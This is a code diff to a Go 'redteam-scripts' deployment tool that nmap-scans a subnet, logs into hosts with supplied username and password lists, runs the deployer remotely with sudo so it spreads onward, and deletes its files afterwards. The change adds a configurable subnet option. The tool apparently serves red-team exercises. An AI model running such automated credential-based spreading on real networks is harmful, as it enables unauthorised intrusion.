@@ -15,6 +15,7 @@ import (
 )
 
 var systemOS string = getOS()
+var subnet string = "/24"
 var isVerbose bool = false
 var isDemo bool = false
 var isThreaded bool = false
@@ -43,7 +44,7 @@ func main() {
 		//Transfer files to target machine for deployment
 		transferFilesRunner([]string{targetIP})
 	} else {
-		//Find all IPs on subnet 0/24
+		//Find all IPs on subnet
 		ips := findIPs()
 		fmt.Print("IP list: ")
 		fmt.Println(ips)
@@ -89,6 +90,7 @@ func runRemote(username, password, ip string) {
 			"echo " + password + " | sudo -S go run deploy-master.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
 	}
 	command += "echo " + password + " | sudo -S rm -rf /tmp/redteam-scripts\n"
+	command += "exit"
 	//Write command to buffer
 	buffer.Write([]byte(command))
 	cmd.Stdin = &buffer
@@ -215,9 +217,8 @@ func findIPs() []string {
 	if isVerbose {
 		fmt.Println("Local IP is " + localIp)
 	}
-	//Get the 0/24 subnet
-	//TODO: add option to specify subnet?
-	ipRange := getPrefix(localIp) + ".0/24"
+	//Get the subnet
+	ipRange := getPrefix(localIp) + ".0" + subnet
 	fmt.Println(ipRange)
 	//Ping scan every IP in the subnet and store which ones repond in greppable format
 	cmd := exec.Command("nmap", "-sn", ipRange, "-oG", ".ipscan_lsshim")
@@ -338,6 +339,8 @@ func handleArgs(args []string) bool {
 					fmt.Println("Error: verbose is not compatible with multithreading")
 					return false
 				}
+			} else if args[i] == "-s" || args[i] == "--subnet" {
+				subnet = args[i+1]
 			} else if args[i] == "-t" || args[i] == "--target" {
 				if len(ignoreIPs) != 0 {
 					fmt.Println("Error: --ignore is not compatible with --target")
@@ -348,14 +351,17 @@ func handleArgs(args []string) bool {
 			} else if args[i] == "--help" || args[i] == "-h" {
 				fmt.Println("redteam-scripts deploy master\n\n" +
 					"usage: go run deploy-master.go -u [username] -p [password] [args]\n" +
-					"-v or --verbose			|	Enable verbose output\n" +
 					"-i [IPs] or --ignore [IPS]	|	Specify a list of IPs to ignore, separated by commas\n" +
 					"-m or --multi			|	Run in multithreaded mode. Not compatible with verbose.\n" +
+					"-s [IP] or --subnet [N]		|	Subnet to deploy on (default: /24)\n" +
 					"-t [IP] or --target [IP]	|	Install on a remote machine & deploy from it\n" +
+					"-v or --verbose			|	Enable verbose output\n" +
 					"				|	instead of the host machine. Not compatible with -i\n" +
 					"--help or -h			|	Display this help menu\n" +
 					"--password-list [PASSWORDS]	|	Specify a list of passwords, separated by commas\n" +
-					"--user-list [USERS]		|	Specify a list of users, separated by commas",
+					"--user-list [USERS]		|	Specify a list of users, separated by commas\n" +
+					"--password-file [FILE]		|	Specify a list of passwords, separated by commas\n" +
+					"--user-list [FILE]		|	Specify a list of users, separated by commas",
 				)
 				return false
 			}
